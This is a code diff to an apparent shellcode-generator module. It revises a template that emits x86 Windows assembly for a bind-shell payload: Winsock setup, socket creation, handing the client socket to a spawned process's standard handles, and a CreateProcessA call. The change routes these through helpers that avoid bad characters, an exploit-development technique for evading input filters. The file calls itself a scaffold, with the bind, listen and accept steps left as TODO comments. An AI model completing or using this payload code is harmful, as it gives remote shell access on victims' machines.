@@ -9,21 +9,28 @@ NOTE: This is a scaffold. bind/listen/accept calls are placeholders.
 from __future__ import annotations
 
 from .base import PayloadTemplate, TemplateConfig
-from ..encode import safe_push_word_as_dword
+from ..encode import (
+    safe_push_word_as_dword, safe_dword_store,
+    safe_lea, safe_mem_load, safe_mem_store,
+    safe_call_mem,
+)
 
 
 class BindShellTemplate(PayloadTemplate):
 
     def emit(self, layout, config: TemplateConfig) -> str:
-        wsa_start = layout.slot("WSAStartup").ebp_ref
-        wsa_sock  = layout.slot("WSASocketA").ebp_ref
-        cpa       = layout.slot("CreateProcessA").ebp_ref
-        sock_h    = layout.slot("socket_handle").ebp_ref
-        bind_s    = layout.slot("bind_socket").ebp_ref
-        wsadata   = layout.slot("WSADATA").ebp_ref
-        si        = layout.slot("STARTUPINFOA").ebp_ref
-        pi        = layout.slot("PROCESS_INFORMATION").ebp_ref
-        cmd       = layout.slot("cmd").ebp_ref
+        bc = config.badchars
+        wsa_start_off = -layout.slot("WSAStartup").offset
+        wsa_sock_off  = -layout.slot("WSASocketA").offset
+        cpa_off       = -layout.slot("CreateProcessA").offset
+        sock_h_off    = -layout.slot("socket_handle").offset
+        bind_s_off    = -layout.slot("bind_socket").offset
+        wsadata_off   = -layout.slot("WSADATA").offset
+        si_off        = -layout.slot("STARTUPINFOA").offset
+        pi_off        = -layout.slot("PROCESS_INFORMATION").offset
+        cmd_off       = -layout.slot("cmd").offset
+
+        sock_h_ref = layout.slot("socket_handle").ebp_ref
 
         return "\n".join([
             "; ── Bind Shell Payload (scaffold) ──────────────────────────────────",
@@ -31,10 +38,10 @@ class BindShellTemplate(PayloadTemplate):
             "; NOTE: bind/listen/accept stubs are not generated — add manually.",
             "",
             "    ; WSAStartup(0x0202, &WSADATA)",
-            f"    lea  esi, {wsadata}",
+            *safe_lea("esi", "ebp", wsadata_off, bc),
             "    push esi",
-            *safe_push_word_as_dword(0x0202, config.badchars),
-            f"    call dword ptr {wsa_start}",
+            *safe_push_word_as_dword(0x0202, bc),
+            *safe_call_mem("ebp", wsa_start_off, bc),
             "",
             "    ; WSASocketA — create bind socket",
             "    xor  eax, eax",
@@ -47,25 +54,26 @@ class BindShellTemplate(PayloadTemplate):
             "    push eax",
             "    inc  eax",
             "    push eax",
-            f"    call dword ptr {wsa_sock}",
-            f"    mov  {bind_s}, eax         ; save bind socket",
+            *safe_call_mem("ebp", wsa_sock_off, bc),
+            *safe_mem_store("ebp", bind_s_off, "eax", bc),
+            "    ; save bind socket",
             "",
             "    ; TODO: bind(bind_socket, &sockaddr, 0x10)",
             "    ; TODO: listen(bind_socket, 0)",
             "    ; TODO: accept(bind_socket, NULL, NULL) -> socket_handle",
-            f"    ; After accept: store client socket in {sock_h}",
+            f"    ; After accept: store client socket in {sock_h_ref}",
             "",
             "    ; Set STARTUPINFOA stdio handles to accepted client socket",
-            f"    mov  eax, {sock_h}",
-            f"    lea  edi, {si}",
-            "    mov  [edi+0x38], eax",
-            "    mov  [edi+0x3c], eax",
-            "    mov  [edi+0x40], eax",
+            *safe_mem_load("eax", "ebp", sock_h_off, bc),
+            *safe_lea("edi", "ebp", si_off, bc),
+            *safe_dword_store("edi", 0x38, "eax", bc, tmp="ecx"),
+            *safe_dword_store("edi", 0x3c, "eax", bc, tmp="ecx"),
+            *safe_dword_store("edi", 0x40, "eax", bc, tmp="ecx"),
             "",
             "    ; CreateProcessA",
-            f"    lea  esi, {cmd}",
-            f"    lea  edi, {si}",
-            f"    lea  ebx, {pi}",
+            *safe_lea("esi", "ebp", cmd_off, bc),
+            *safe_lea("edi", "ebp", si_off, bc),
+            *safe_lea("ebx", "ebp", pi_off, bc),
             "    xor  eax, eax",
             "    push ebx",
             "    push edi",
@@ -79,7 +87,7 @@ class BindShellTemplate(PayloadTemplate):
             "    push eax",
             "    push esi",
             "    push eax",
-            f"    call dword ptr {cpa}",
+            *safe_call_mem("ebp", cpa_off, bc),
             "",
         ])
 
